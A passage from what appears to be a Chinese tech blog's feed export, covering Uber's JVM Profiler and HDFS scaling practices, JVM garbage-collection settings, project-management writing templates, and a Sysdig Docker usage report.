-javaagent:target/jvm-profiler-0.0.5.jar=reporter=com.uber.profiling.reporters.ConsoleOutputReporter -cp target/jvm-profiler-0.0.5.jar com.uber.profiling.examples.HelloWorldApplication 上述命令行将运行一个简单的 Java 应用并通过控制台输出性能和资源使用情况。例如： Nill JVM Profiler 也能通过命令行将指标数据发送到 Kafka topic : Nill Use the profiler to profile the Spark application示例：基于 JVM Profiler 跟踪 Spark 应用 假定我们已经有一个 HDFS 集群，将 JVM Profiler JAR 上传到 HDFS 1hdfs dfs -put target/jvm-profiler-0.0.5.jar hdfs://hdfs_url/lib/jvm-profiler-0.0.5.jar 使用 spark-submit 命令行启动 Spark 应用1spark-submit --deploy-mode cluster --master yarn --conf spark.jars=hdfs://hdfs_url/lib/jvm-profiler-0.0.5.jar --conf spark.driver.extraJavaOptions=-javaagent:jvm-profiler-0.0.5.jar --conf spark.executor.extraJavaOptions=-javaagent:jvm-profiler-0.0.5.jar --class com.company.SparkJob spark_job.jar 指标查询Uber 将指标数据发送到 Kafka topic 和后台数据管线并自动存储于 Hive tables 。用户可以设置类似的管线并使用 SQL 查询指标数据。用户也可以编写自己的 reporter , 将指标发送到 SQL 数据库（如 MySQL）。Hive table 查询示例，包含每个进程的内存和 CPU 指标： NextUber 将 JVM Profiler 应用到自己最大 Spark 应用 (1000 多个 executor ), 在该过程中将每个 executor 分配的内存减少了 2GB （从 7GB 降低到 5GB ）。对于整个 Spark 应用来说合计节省 2TB 内存。 Uber 还将 JVM Profiler 应用到了所有 Hive on Spark 应用, 并发现了一些提高内存使用效率的机会。下面的图3显示了 Uber 发现的一个结果: 大约70% 的应用程序的实际内存利用率不到已分配内存的 80% 。研究结果表明, 大多数应用程序可以分配较少的内存并将内存利用率提高 20% 。 Tips1234567891011121314151617181920212223242526272829303132$ mvn package[INFO] Scanning for projects...[INFO][INFO] -----------------------&lt; com.uber:jvm-profiler &gt;------------------------[INFO] Building uber-jvm-profiler 0.0.7[INFO] --------------------------------[ jar ]---------------------------------[INFO] Including org.apache.kafka:kafka-clients:jar:0.11.0.2 in the shaded jar.[INFO] Including net.jpountz.lz4:lz4:jar:1.3.0 in the shaded jar.[INFO] Including org.xerial.snappy:snappy-java:jar:1.1.2.6 in the shaded jar.[INFO] Including org.slf4j:slf4j-api:jar:1.7.25 in the shaded jar.[INFO] Including org.apache.commons:commons-lang3:jar:3.5 in the shaded jar.[INFO] Including com.fasterxml.jackson.core:jackson-core:jar:2.8.9 in the shaded jar.[INFO] Including com.fasterxml.jackson.core:jackson-databind:jar:2.8.9 in the shaded jar.[INFO] Including com.fasterxml.jackson.core:jackson-annotations:jar:2.8.0 in the shaded jar.[INFO] Including org.javassist:javassist:jar:3.21.0-GA in the shaded jar.[INFO] Including org.yaml:snakeyaml:jar:1.18 in the shaded jar.[INFO] Including org.apache.httpcomponents:httpclient:jar:4.3.6 in the shaded jar.[INFO] Including org.apache.httpcomponents:httpcore:jar:4.3.3 in the shaded jar.[INFO] Including commons-logging:commons-logging:jar:1.1.3 in the shaded jar.[INFO] Including commons-codec:commons-codec:jar:1.6 in the shaded jar.[INFO] Including redis.clients:jedis:jar:2.9.0 in the shaded jar.[INFO] Including org.apache.commons:commons-pool2:jar:2.4.2 in the shaded jar.[INFO] Replacing original artifact with shaded artifact.[INFO] Replacing /Users/yanrui/project-third/jvm-profiler/target/jvm-profiler-0.0.7.jar with /Users/yanrui/project-third/jvm-profiler/target/jvm-profiler-0.0.7-shaded.jar[INFO] Dependency-reduced POM written at: /Users/yanrui/project-third/jvm-profiler/dependency-reduced-pom.xml[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time: 03:38 min[INFO] Finished at: 2018-08-07T09:50:26+08:00[INFO] ------------------------------------------------------------------------bash-3.2$ 123456789## MVN$ wget http://mirrors.hust.edu.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz$ tar -xvf apache-maven-3.5.4-bin.tar.gz$ echo 'export M2_HOME="/usr/local/apache-maven-3.5.4" ' &gt;&gt; ~/.bash_profile$ echo 'export PATH=$M2_HOME/bin:$PATH' &gt;&gt; ~/.bash_profile$ . ~/.bash_profile$ mvn -vApache Maven 3.5.4 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux参考文献 Java 应用性能调优实践 | IBM developerworks | 张 俊城, 郭 理勇, 和 刘 建 | 2016 年 6 月 28 日发布 用“逐步排除”的方法定位Java服务线上“系统性”故障 动态追踪技术-应用性能瓶颈排障利器之火焰图 | 郑晓川 江凌生 京东商城技术架构 | 2016-12-01]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：Hadoop]]></title>
    <url>%2F2018%2F08%2F01%2FOpenSource-Hadoop%2F</url>
    <content type="text"><![CDATA[摘要 Uber Hadoop 文件系统最佳实践 Scaling out using ViewFs HDFS upgrades NameNode Garbage collection Controlling the number of small files DFS load management service New Feature : Observer NameNode Router-based HDFS Federation Engineering : 独立的群集（isolated clusters）、分阶段升级过程（a staged upgrade process）和应急回滚计划（contingency rollback plans） Introduction | Apache Hadoop 简介Core Concept | Apache Hadoop 核心概念 MapReduce: Simplified Data Processing on Large Clusters The Google File SystemConcept AConcept BConcept C Architecture | Apache Hadoop 架构 Presto:Distributed SQL Query Engine for Big Data ViewFs Guide WebHDFS REST API Best Practice | Apache Hadoop 最佳实践Uber Hadoop 文件系统最佳实践 原文：April 5, 2018 Scaling Uber’s Apache Hadoop Distributed File System for Growth How Uber implemented these improvements to facilitate the continued growth, stability, and reliability of our storage system. 三年前, Uber 工程团队引入 Hadoop 作为大数据分析的存储 (HDFS) 和计算 (YARN) 基础设施。 Uber 使用 Hadoop 进行批量和流式分析, 广泛应用于包括欺诈检测（ fraud detection）、机器学习（machine learning）和 ETA 计算(Estimated Time of Arrival)等领域。在过去的几年里, Uber 的业务发展迅猛,数据量和相关的访问负载呈指数级增长 ; 仅在 2017年, 存储在 HDFS 上的数据量就增长了400% 以上。 在扩展基础设施的同时保持高性能可不是一件轻松的事。为了实现这一目标,Uber 数据架构团队通过实施若干新的调整和功能来扩展 HDFS , 包括可视化文件系统（View File System ，ViewFs）、频繁的 HDFS 版本升级、NameNode 垃圾回收调整, 限制通过系统筛选小文件的数量、HDFS 负载管理服务和只读 NameNode 副本。下面将详细介绍如何执行这些改进以促进存储系统的持续增长、稳定性和可靠性。 ChallengesHDFS 被设计为可伸缩的分布式文件系统, 单个群集支持上千个节点。只要有足够的硬件, 在一个集群中可以轻松、快速地扩展实现超过 100 pb 的原始存储容量。 然而对于 Uber 而言, 业务迅速增长使其难以可靠地进行扩展同时而不减慢数据分析的速度。成千上万的用户每周都要执行数以百万计的查询（通过 Hive 或 Presto ）。 目前, HDFS 超过一半以上的访问源于 Presto, 并且 90% 的 Presto 查询需要 100 秒以上的时间来处理。如果我们的 HDFS 基础结构超载, 那么在队列中的查询就会堆积起来, 从而导致查询延迟。更为重要的是，对于每个查询而言，我们需要在 HDFS 上尽快地提供数据。 针对原来的存储基础架构, 我们设计了提取（extract）、转换（transform）和加载 (ETL) 机制以便在用户运行查询时减少同一集群中发生的复制延迟。这些群集由于具有双重职责，因而需要生成小文件以适应频繁的写入和更新, 这反而进一步堵塞了队列。 在我们面临的挑战中，首要任务是多个团队需要大量的存储数据, 这就决定了不能采用按照用例或组织进行集群分割的方案, 那样反过来会降低效率的同时增加成本。 造成减速的根源 — 在不影响用户体验的情况下扩展 HDFS 的主要瓶颈是 NameNode 的性能和吞吐量, 它包括系统中所有文件的目录树, 用于跟踪保存数据文件的位置。由于所有元数据都存储在 NameNode 中, 因此客户端对 HDFS 群集的请求必须首先通过它。更复杂的是, NameNode 命名空间上的ReadWriteLock 限制了 NameNode 可以支持的最大吞吐量, 因为任何写入请求都将被独占写锁定, 并强制任何其他请求都在队列中等待。 2016 年晚些时候, 我们开始发现 NameNode RPC 队列时间高的问题。有时, NameNode 队列时间可能超过每个请求 500毫秒 (最慢的队列时间达到接近一秒), 这意味着每一个 HDFS 请求在队列中至少等待半秒 – 与我们的正常进程时间（10 毫秒以下）相比, 这是明显的减速。 Enabling scaling &amp; improving performance为了确保 HDFS 高性能运行的同时持续扩展, Uber 并行开发多个解决方案, 以避免在短期内出现停机。这些解决方案使我们建立了一个更可靠和可扩展的系统, 能够支持未来的长期增长。 改进方案概述如下： Scaling out using ViewFsTwitter 尝试过类似努力，在他们的启发下, 我们利用可视化文件系统 (ViewFs) 将 HDFS 拆分为多个物理命名空间, 并使用 ViewFs 挂载点向用户呈现一个虚拟命名空间。 为了完成这一目标, 我们将 HBase（YARN 和 Presto 操作）从相同的 HDFS 集群分开。该调整不仅大大减少了主集群上的负载, 而且使我们的 HBase 更加稳定, 将 HBase 集群的重启时间从几小时减少到几分钟。 我们还为聚合 YARN 应用日志创建了一个专用的 HDFS 群集。要使日志聚合支持 ViewFs, 需要 YARN-3269。我们的 Hive 临时目录也被移动到这个群集。增加集群的结果是非常令人满意的 ; 目前, 新群集的服务总写入请求数约占总数的 40%, 而且大多数文件都是小文件, 这也减轻了主群集上的文件计数压力。由于对现有应用程序而言，不需要更改客户端, 因此改转换非常顺利。 最后, 我们在 ViewFs 后端实现了独立的的 HDFS 群集, 而不是基础架构中的 HDFS Federation 。通过这种设置, 可以逐步执行 HDFS 升级, 最大限度地减少大规模停机的风险; 此外, 完全隔离还有助于提高系统的可靠性。然而, 这种修复方案的一个缺点是, 保持单独的 HDFS 群集会导致更高的运营成本。 HDFS upgrades第二个解决方案是升级 HDFS 以跟上最新版本。我们一年执行了两次主要升级, 首先从 CDH 5.7.2 ( 包含大量 HDFS 2.6.0 补丁) 升级到 Apache 2.7.3, 然后升级到 Apache 2.8.2。为此, 我们还必须重构基于 Puppet 和 Jenkins 之上的部署框架, 以更换第三方群集管理工具。 版本升级带来了关键的可伸缩性改进, 包括 HDFS-9710、HDFS-9198 和 HDFS-9412。例如, 升级到 Apache 2.7.3 后, 增量块报告（incremental block report）的数量明显减少, 从而减轻了 NameNode 的负载。 升级 HDFS 可能会有风险, 因为它可能会导致停机、性能下降或数据丢失。为了解决这些可能的问题, 我们花了几个月的时间来验证 Apache 2.8.2 之后才将其部署到生产环境中。但是, 在升级最大的生产集群时, 仍然有一个 Bug (HDFS-12800) 让我们措手不及。尽管 Bug 引起的问题很晚才发现, 但是凭借独立群集、分阶段升级过程（a staged upgrade process）和应急回滚计划（contingency rollback plans），最后给我们的影响非常有限。 事实证明，在同一台服务器上运行不同版本的 YARN 和 HDFS 的能力对于我们实现扩展至关重要。由于 YARN 和 HDFS 都是 Hadoop 的一部分, 它们通常一起升级。然而, YARN 主线版本的升级需要更长时间的充分验证之后才会推出, 一些生产应用的 YARN 可能需要更新，由于 YARN API 的变化或 YARN 和这些应用的 JAR 依赖冲突。虽然 YARN 的可伸缩性在我们的环境中不是一个问题, 但我们不希望关键的 HDFS 升级被 YARN 升级阻塞。为了防止可能的堵塞, 我们目前运行的 YARN 比 HDFS 的版本更早, 在我们的场景很有效。(但是, 当采用诸如 Erasure Coding 之类的功能时, 由于需要更改客户端, 此策略可能不起作用。） NameNode Garbage collection垃圾回收 (Garbage collection , GC) 调优在整个优化方案中也发挥了重要作用。它在扩展存储基础架构的同时，给我们创造了必要的喘息空间。 通过强制使用并发标记扫描收集器 (Concurrent Mark Sweep collectors ，CMS) 防止长时间 GC 暂停, 通过调整 CMS 参数 (如 CMSInitiatingOccupancyFraction、UseCMSInitiatingOccupancyOnly 和 CMSParallelRemarkEnabled ) 来执行更具侵略性的老年代集合（注：CMS 是分代的，新生代和老年代都会发生回收。CMS 尝试通过多线程并发的方式来跟踪对象的可达性，以便减少老生代的收集时间）。虽然会增加 CPU 利用率, 但幸运的是我们有足够的空闲 CPU 来支持此功能。 由于繁重的 RPC 负载, 在新生代中创建了大量短期的对象, 迫使新生代收集器频繁地执行垃圾回收暂停（stop-the-world）。通过将新生代的规模从 1.5GB 增加到 16GB , 并调整 ParGCCardsPerStrideChunk 值 (设置为 32768), 生产环境中 NameNode 在 GC 暂停时所花费的总时间从 13% 减少到 1.7% , 吞吐量增加了 10% 以上。 与 GC 相关的 JVM 参数( NameNode 堆大小 160GB ）, 供参考： 1234567XX:+UnlockDiagnosticVMOptionsXX:ParGCCardsPerStrideChunk=32768 -XX:+UseParNewGCXX:+UseConcMarkSweepGC -XX:+CMSConcurrentMTEnabledXX:CMSInitiatingOccupancyFraction=40XX:+UseCMSInitiatingOccupancyOnlyXX:+CMSParallelRemarkEnabled -XX:+UseCondCardMarkXX:+DisableExplicitGC Uber 还在评估是否将第一垃圾回收器 (Garbage-First Garbage Collector , G1GC) 集成在系统中。虽然在过去使用 G1GC 时没有看到优势, 但 JVM 的新版本带来了额外的垃圾回收器性能改进, 因此重新审视收集器和配置的选择有时是必要的。 Controlling the number of small files由于 NameNode 将所有文件元数据加载到内存中, 小文件增长会增加 NameNode 的内存压力。此外, 小文件会导致读取 RPC 调用增加, 以便在客户端读取文件时访问相同数量的数据, 以及在生成文件时增加 RPC 调用。为了减少存储中小文件的数量, Uber 主要采取了两种方法： 首先，Uber Hadoop 数据平台团队基于 Hoodie 库建立了新的摄取管道, 生成比原始数据管道创建的更大的文件。不过, 作为一个临时解决方案, 在这些可用之前, 我们还建立了一个工具 (称为 stitcher “订书机”), 将小文件合并成较大的文件（通常大于 1GB ）。 其次, 在 Hive 数据库和应用程序目录上设置了严格的命名空间配额。为了贯彻这一目标, 我们为用户创建了一个自助服务工具, 用于管理其组织内的配额。配额的分配比例为每文件 256MB, 以鼓励用户优化其输出文件大小。Hadoop 团队还提供优化指南和文件合并工具以帮助用户采用最佳实践。例如, 在 Hive 上启用自动合并（auto-merge）和调整减速器数量（the number of reducers ）可以大大减少由 Hive insert-overwrite 查询生成的文件数。 HDFS load management service运行大型多租户基础架构 (如 HDFS ) 的最大挑战之一是检测哪些应用程序导致异常大的负载、如何快速采取措施来修复它们。为了实现这一目的，Uber 构建了内置 HDFS 的负载管理服务, 称为 Spotlight 。 在目前的 Spotlight 实现中, 审计日志从活跃的 NameNode 以流的形式送到一个基于 Flink 和 Kafka 的后端实时处理。最后，日志分析结果通过仪表板输出, 并用于自动化处理（例如自动禁用帐户或杀死导致 HDFS 减速的工作流）。 New Feature : Observer NameNodeUber 正在开发一个新的 HDFS 功能 Observer NameNode (HDFS-12975) 。 Observer NameNode 设计为一个 NameNode 只读副本, 目的是减少在活跃的 NameNode 群集上加载。由于 HDFS RPC 容量和增长的一半以上来自只读的 Presto 查询, Uber 希望借助 Observer NameNodes 的帮助将总体 NameNode 吞吐量扩展到 100% 。Uber 已经完成了这个工具的验证, 并正在将其投入生产环境中。 最佳实践 Layer your solutions: 考虑不同层次的解决方案。实现像 Observer NameNode 那样的工具或将 HDFS 切分到多集群需要付出巨大的努力。短期措施, 如 GC 调整和通过 stitcher 合并较小的文件, 给了我们很多喘息的空间以开发完善长期的解决方案。 Bigger is better: 因为小文件对 HDFS 的威胁, 所以最好及早解决它们, 而不是延后。主动向用户提供工具、文档和培训是帮助实施最佳实践非常有效的方法。 Participate in the community: Hadoop 已经存在超过 10 年了, 其社区比以往任何时候都更加活跃, 几乎每个版本中都引入了可伸缩性和功能改进。通过贡献您自己的发现和工具来参与 Hadoop 社区对于你持续扩展基础架构非常重要。 未来在不久的将来, Uber 计划将各种新服务集成到存储系统（如 图6 所示）。 接下来重点介绍两个主要项目, 基于路由的 HFDS Federation 和 tiered storage : Router-based HDFS FederationUber 目前使用 ViewFs 扩展 HDFS （当 subclusters 超载时）。此方法的主要问题是, 每次在 ViewFs 上添加或替换新的挂载点时, 都需要更改客户端配置, 而且很难在不影响生产工作流的情况下进行。这种困境是我们目前只拆分不需要大规模更改客户端数据的主要原因之一, 例如 YARN 日志聚合。 Microsoft 的新倡议—基于路由的 HFDS Federation (HDFS-10467, HDFS-12615),目前包含在 HDFS 2.9 版本中, 是一个基于 ViewFs 的分区联盟的扩展。该联盟添加了一层软件集中管理 HDFS 命名空间。通过提供相同的接口 (RPC 和 WebHDFS 的组合), 它的外层为用户提供了对任何 subclusters 的透明访问, 并让 subclusters 独立地管理其数据。 通过提供再平衡工具( a rebalancing tool ), 联盟层( the federation layer )还将支持跨 subclusters 的透明数据移动, 用于平衡工作负载和实现分层存储。联盟层集中式维护状态存储区中全局命名空间的状态, 并允许多个活跃的路由器将用户请求定向到正确的 subclusters 时启动和运行。 Uber 正在积极地与 Hadoop 社区密切协作，致力于将基于路由的 HDFS Federation 引入到生产环境, 并进一步开源改进, 包括支持 WebHDFS 。 Tiered Storage随着基础架构的规模增长, 降低存储成本的重要性也同样重要。Uber 技术团队中进行的研究表明, 相较旧数据 (warm data) 用户会更频繁地访问最近的数据 (hot data)。将旧数据移动到一个单独的、占用较少资源的层将大大降低我们的存储成本。HDFS Erasure Coding 、Router-based Federation、高密度 (250TB 以上) 硬件和数据移动服务 (在 “热” 层群集和 “暖” 层群集之间处理移动数据) 是即将进行的分层存储设计的关键组件。Uber 计划在以后的文章中分享在分层存储实现方面的经验。 Apache Hadoop ABC123456789101112$ hadoop versionHadoop 3.1.0Source code repository https://github.com/apache/hadoop -r 16b70619a24cdcf5d3b0fcf4b58ca77238ccbe6dCompiled by centos on 2018-03-30T00:00ZCompiled with protoc 2.5.0From source with checksum 14182d20c972b3e2105580a1ad6990This command was run using /usr/local/Cellar/hadoop/3.1.0/libexec/share/hadoop/common/hadoop-common-3.1.0.jar# 常见异常：检查 JDK 版本是否过低$ hadoop versionException in thread "main" java.lang.UnsupportedClassVersionError: org/apache/hadoop/util/VersionInfo : Unsupported major.minor version 52.0 at java.lang.ClassLoader.defineClass1(Native Method) Java Garbage Collection Types Serial GC (-XX:+UseSerialGC): Serial GC uses the simple mark-sweep-compact approach for young and old generations garbage collection i.e Minor and Major GC.Serial GC is useful in client-machines such as our simple stand alone applications and machines with smaller CPU. It is good for small applications with low memory footprint. Parallel GC (-XX:+UseParallelGC): Parallel GC is same as Serial GC except that is spawns N threads for young generation garbage collection where N is the number of CPU cores in the system. We can control the number of threads using -XX:ParallelGCThreads=n JVM option.Parallel Garbage Collector is also called throughput collector because it uses multiple CPUs to speed up the GC performance. Parallel GC uses single thread for Old Generation garbage collection. Parallel Old GC (-XX:+UseParallelOldGC): This is same as Parallel GC except that it uses multiple threads for both Young Generation and Old Generation garbage collection.Concurrent Mark Sweep (CMS) Collector (-XX:+UseConcMarkSweepGC): CMS Collector is also referred as concurrent low pause collector. It does the garbage collection for Old generation. CMS collector tries to minimize the pauses due to garbage collection by doing most of the garbage collection work concurrently with the application threads.CMS collector on young generation uses the same algorithm as that of the parallel collector. This garbage collector is suitable for responsive applications where we can’t afford longer pause times. We can limit the number of threads in CMS collector using -XX:ParallelCMSThreads=n JVM option. G1 Garbage Collector (-XX:+UseG1GC): The Garbage First or G1 garbage collector is available from Java 7 and it’s long term goal is to replace the CMS collector. The G1 collector is a parallel, concurrent, and incrementally compacting low-pause garbage collector.Garbage First Collector doesn’t work like other collectors and there is no concept of Young and Old generation space. It divides the heap space into multiple equal-sized heap regions. When a garbage collection is invoked, it first collects the region with lesser live data, hence “Garbage First”. You can find more details about it at Garbage-First Collector Oracle Documentation. 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：开源架构技术漫谈 开源架构技术漫谈：Hadoop 基于Kafka构建事件溯源型微服务 基于Go语言快速构建一个RESTful API服务 数据可视化（三）基于 Graphviz 实现程序化绘图 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 计算机远程通信协议：从 CORBA 到 gRPC 基于LVS的AAA负载均衡架构实践 基于Ganglia实现服务集群性能态势感知 Stack Overflow：云计算平台的趋势分析 Stack Overflow：2017年最赚钱的编程语言 Stack Overflow: The Architecture &amp; Hardware - 2016 Edition 参考文献 Java (JVM) Memory Model – Memory Management in Java Example of ViewFs mount table entries Hadoop filesystem at Twitter 董的博客-HDFS Federation设计动机与基本原理 Presto实现原理和美团的使用实践]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>OpenSource</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:项目管理开局模板|工具与技术]]></title>
    <url>%2F2018%2F06%2F19%2FProject-Template%2F</url>
    <content type="text"><![CDATA[摘要 学习范式 写作范式 输出范式 探索在本质上是分散行动，并通过一种可扩展的通信机制来协调整体行为。–《大教堂与集市》 范式1：主题式1.1 主题式/推荐解决方案123456789101112131415161718192021222324252627## 摘要&lt;!--more--&gt;## Background#### Question#### Theory## Introduction | XX简介## Core Concept | 核心概念 #### Concept A#### Concept B#### Concept C## Architecture Overview#### Files Tree## Best Practice | XX 最佳实践## Future：Beyond the XXX## 阅读作业## 拓展阅读## 参考文献 1.2 主题式/开放式解决方案123456789101112131415161718192021222324252627282930## 摘要&lt;!--more--&gt;## Background#### Question#### Overview Current Solutions- solution 1. 利/弊- solution 2. 利/弊- solution 3. 利/弊## Introduction XXXX Solution (New)#### Overview of XXXX Theory##### Concept A | 核心概念 ##### Concept B | 核心概念 ##### Concept C | 核心概念 ## Overview of XXXX Practice （最佳实践）## Future：Beyond the XXX## 阅读作业## 拓展阅读## 参考文献 范式2：网络协议12345678910## XX 协议简介 | Introduction- [RFC no](\#)- [RFC no](\#)## Core Concept | 核心概念#### Concept A#### Concept B#### Concept C## Architecture Overview#### Files Tree## Best Practice | XX 最佳实践 范式3：翻译文章1234567## Title- 原标题：Seven Things to Know about Technical Writing at Uber- 链接：[https://eng.uber.com/technical-writing-uber/]- 作者：Shannon Brown- 发表时间：October 3, 2018 范式4：系列文章1234This article is part of an **Distributed Tracing and Monitoring System** tutorial series. Make sure to check out my other articles as well:- [DevOps 漫谈：分布式追踪系统体系概要](https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/)- [DevOps 漫谈：开源分布式跟踪系统 OpenCensus](https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus) 范式5：书籍目录123456789101112131415161718192021222324# 情报驱动应急响应- Intelligence-Driven Incident Response: Outwitting the Adversary## 序言## 前言# 第一部分 基础知识## 第 1 章 概述#### 1.1.1 网络威胁情报的历史 History#### 1.1.2 现代网络威胁情报#### 1.1.3 未来之路 Future#### 1.2 什么是情报驱动的事件响应 What#### 1.4 为什么是情报驱动的事件响应 Why## 第 2 章 情报原则## 第 3 章 事件响应原则# 第二部分 实战篇## 第 4 章 查找## 第 5 章 定位## 第 6 章 消除## 第 7 章 利用## 第 8 章 分析## 第 9 章 传播# 第三部分 未来之路## 第 10 章 战略情报## 第 11 章 建立情报计划# 附录 范式6：表格结构 项目 属性A 属性B 属性C 数据1 数据2 数据3 项目 属性A 属性B 属性C 数据11 数据12 数据13 数据14 数据15 数据21 数据22 数据23 数据24 数据25 数据31 数据32 数据33 数据34 数据35 数据42 数据43 数据44 数据45 范式7：树形结构12345678910|—— root| |—— dir 2| | |——dir 2-1| | |——dir 2-2| | |__dir 2-3| |—— dir 3| | |——dir 3-1| | |——dir 3-2| | |__dir 3-3| |__ file.md 范式8：事件简报12345678910111213141516171819202122232425# 事件名称## 摘要&gt;a&gt;b&gt;c## 时间线- 2019-01-01 xxxxx- 2019-01-11 xxxxx- 2019-02-01 xxxxx## 影响## 意见建议- 建议1- 建议2- 建议3## 正在采取的行动## 参考资料 范式9：研究课题12345678910111213141516171819202122232425262728293031# 课题名称## 摘要&gt;a&gt;b&gt;c## 里程碑目标- 2019-01-01 xxxxx- 2019-01-11 xxxxx- 2019-02-01 xxxxx## 阅读作业- 作业1- 作业2- 作业3## 理论成果- 成果1- 成果2- 成果3## 工程实践- 实践1- 实践2- 实践3 范式10：Flow Chart10.1 Flow Chart Dot1234digraph flow&#123; a-&gt;b; b-&gt;c;&#125; 10.2 Flow Chart Sequence123456789101112131415161718participant 自然 as Nparticipant 科学 as Sparticipant 商业 as Bparticipant 工程 as Eparticipant 教育 as EDparticipant 法律 as Lparticipant 公共 as Pparticipant 社会 as SB-&gt;E:项目管理 拓展阅读 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献 How to teach yourself hard things Just-In-Case vs. Just-In-Time Learning Brains Cling to Old Habits When Learning New Tricks The Uncertainty Tax: the financial cost of not knowing things 专业主义，从备忘录开始 | 原创： 阳志平 心智工具箱 2018-05-10 康奈尔笔记法 | The Cornell Note-taking System]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：容器技术]]></title>
    <url>%2F2018%2F06%2F12%2FDevOps-Container-Usage%2F</url>
    <content type="text"><![CDATA[摘要 2018 Docker 用户报告 - Sysdig Edition 应用排行榜 容器运行环境 容器编排器 容器监控 This article is part of an Virtualization Technology tutorial series. Make sure to check out my other articles as well: 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC 根据 Sysdig 发表的年度 Docker 用户报告，在容器市场 Docker 仍然是事实上的行业标准，但是其它品牌的容器运行环境正在发展；Kubernetes 仍然是容器编排领域的王者。报告的数据来源主要依据 Sysdig Monitor 和 Sysdig Secure cloud service 提供的容器使用状况的实时快照报告，它们从容器健康、性能和安全性等方面提供度量指标和可视化服务。样本集包括垂直行业和各类规模不等的大中型企业，地域覆盖北美洲、拉丁美洲、EMEA（欧洲、中东、非洲）和亚太地区。与去年一样，这份报告并不是用来代表整个容器市场。因为数据仅限于 Sysdig 客户，所以对于那些选择商业和开源解决方案的公司来说不具有代表性。但是来自 90000 个容器用户汇总数据，确实提供了了解真实生产环境容器使用状况的独特视角。 2018 Docker 用户报告 - Sysdig Edition容器应用排行榜容器部署应用榜首：Java Virtual Machines (JVM)。在容器时代之前，Java 就广泛应用于企业级服务，目前两者 —— Java 和容器更加紧密地融合到了一起。 我们还看到数据库解决方案的使用在增加, 例如在容器环境中运行 PostgreSQL) 和 MongoDB 。这是一个信号, 表明在容器中部署有状态服务已经成为现实。容器的短暂性，让许多人对于在容器中运行高价值数据服务抱有怀疑态度, 但是市场回答了问题的解决方案–即为微服务设计的持久、便携和共享存储。数据显示, 客户开始转向完全由容器驱动的环境。 容器密度在2017年每个主机的容器数的中位数是 10 。2018年，这个数字上升到 15，同比增长 50% 。另一方面，我们看到一个客户的单台主机上运行了 154 个容器，比我们去年观察到的最大 95 个增长了。 容器运行环境 Docker still reigns, but we’re seeing what might be the first signs of cracks in the dam. 事实上的容器运行环境依然是Docker。我们在 2017 年的报告中没有提及其他容器运行环境的详细信息, 因为在当时 Docker 的占有率接近 99% 。但是, 鉴于最近的一些变化： Red Hat 收购 CoreOS 的 (RKT 的制造商)，以及 Open Container Initiative (OCI) 项目 — 旨在推进容器运行环境和镜像标准化。 事实上，在过去的一年里, 客户对其他平台的使用增加了。CoreOS RKT 显著增长到 12% , Mesos containerizer 占有 4% 。LXC 也在增长, 尽管从业人员规模比例还较低。数据显示, 客户在生产环境中使用 “non-Docker” 解决方案更加便利了。 容器存活周期95% 的容器存活时间低于一周。 容器和服务的生存时间是多少？ 我们观察了容器、容器镜像和服务的数量, 它们在短时间内开始并停止, 存活10秒或更短, 或者一周或更长。下图显示不同间隔内的容器百分比。 11% 的容器活了不到10秒。大部分容器（27%） 的生存期在五分钟之内。 为什么这么多的容器寿命如此之短呢？我们知道许多定制的系统都是按照需求来扩展的。容器被创建, 做他们的工作, 然后离开。例如, 一个客户为他们在 Jenkins 创建的每个作业配置一个容器，执行变更测试, 然后关闭容器。对他们来说, 类似活动每天会发生上千次。（Jenkins：一个用 Java 编写的开源持续集成工具，MIT许可证。它支持软件配置管理工具，如CVS、Subversion 和 Git 等，可以执行基于 Apache Ant 和 Apache Maven 的项目，以及任意的Shell 脚本/批处理命令。） 镜像存活周期我们还观察了容器镜像的使用时间。通过查看这些数据, 我们了解到客户在 DevOps CI/CD 流程的一部分中是如何频繁地进行新的容器更新部署的。 一小部分 – 一个百分点–在不到10秒内更新。69% 的容器镜像在一周的跨度内更新。 